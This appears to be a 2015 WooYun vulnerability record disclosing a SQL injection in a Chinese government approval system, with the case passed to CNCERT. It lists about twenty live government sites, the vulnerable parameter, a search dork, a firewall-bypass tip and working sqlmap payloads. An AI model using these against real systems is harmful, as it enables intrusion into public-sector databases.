{"id": 29428, "wybug_id": "wooyun-2015-0119413", "wybug_title": "某政务系统通用SQL注入漏洞，影响众多政府单位", "wybug_corp": "河北邯郸连邦软件", "wybug_author": "路人甲", "wybug_date": "2015-06-10 11:45", "wybug_open_date": "2015-09-13 10:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "14", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向公众公开  简要描述： 某政务系统通用SQL注入漏洞，影响众多政府单位 详细说明：  系统开发厂商：邯郸市连邦软件发展有限公司系统架构：ASPX+MSSQL漏洞文件：workplate/comm/noti/mobilemsgsend.aspx注入参数：tbMobile关键字：inurl：workplate/部分政府案例：日照市网上审批系统http://www.rzfwzx.gov.cn/workplate/保定市网上审批系统http://www.bdxzfw.cn/workplate/磁县网上审批系统http://www.cxxzfwzx.com/workplate/魏县网上审批系统http://wxxz.gov.cn/workplate/邯郸县网上审批系统http://www.hdxzwzx.com/workplate/南郊区网上审批系统http://xz.njqsp.com:8001/workplate/城区网上审批系统http://211.142.37.152:81/workplate/左云县网上审批系统 http://211.142.37.152:88/workplate/天镇县网上审批系统http://211.142.37.154:83/workplate/广灵县网上审批系统 http://211.142.37.152:83/workplate/新荣区网上审批系统http://183.203.128.238:82/workplate/矿区网上审批系统http://211.142.41.114:82/workplate/涉县网上审批系统http://www.hbsxxzfwzx.gov.cn/workplate/临漳县网上审批系统http://www.lzxzfwzx.com/workplate/安新县网上审批系统http://www.axxzfwzx.com/workplate/高阳县网上审批系统http://gyxzfw.net/workplate/长子县网上审批系统http://60.220.253.153:81/workplate/屯留县网上审批系统http://60.220.240.7/workplate/浑源县网上审批系统http://211.142.37.152:85/workplate/邱县网上审批系统www.qxxzfwzx.com/workplate/南郊区网上审批系统http://xz.njqsp.com:8001/workplate/大同县网上审批系统http://211.142.37.152:82/workplate/   漏洞证明：  漏洞验证：http://gyxzfw.net/workplate/comm/noti/mobilemsgsend.aspx为例：部分安装有安全狗，可使用延时注入或者space2comment.py\n\n\nPOST /workplate/comm/noti/mobilemsgsend.aspx HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://gyxzfw.net/workplate/comm/noti/mobilemsgsend.aspxAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/7.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: gyxzfw.netContent-Length: 115Proxy-Connection: Keep-AlivePragma: no-cacheCookie: ASP.NET_SessionId=fxhjipqobhwwf2i1l04kji55__VIEWSTATE=%2FwEPDwUKMTYwMTAyNjE2MWRkLFn9uNBntvxwAv10aePBSyjJMtE%3D&tbMsg=aa&tbMobile=aa&btnAdd=%E5%8F%91%E9%80%81\n\nPlace: POSTParameter: tbMobile    Type: boolean-based blind    Title: Microsoft SQL Server/Sybase stacked conditional-error blind queries    Payload: __VIEWSTATE=/wEPDwUKMTYwMTAyNjE2MWRkLFn9uNBntvxwAv10aePBSyjJMtE=&tbMsg=aa&tbMobile=aa'); IF(9183=9183) SELECT 9183 ELSE DROP FUNCTION pwbL--&btnAdd=%E5%8F%91%E9%80%81    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwUKMTYwMTAyNjE2MWRkLFn9uNBntvxwAv10aePBSyjJMtE=&tbMsg=aa&tbMobile=aa'); WAITFOR DELAY '0:0:5'--&btnAdd=%E5%8F%91%E9%80%81    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwUKMTYwMTAyNjE2MWRkLFn9uNBntvxwAv10aePBSyjJMtE=&tbMsg=aa&tbMobile=aa') WAITFOR DELAY '0:0:5'--&btnAdd=%E5%8F%91%E9%80%81---\n\n\n\n\nDBA：\n\n等等   修复方案：  如上！   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-06-15 10:48 厂商回复： CNVD确认所述情况，已经转由CNCERT下发给河北分中心，由其后续协调网站管理单位及厂商处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}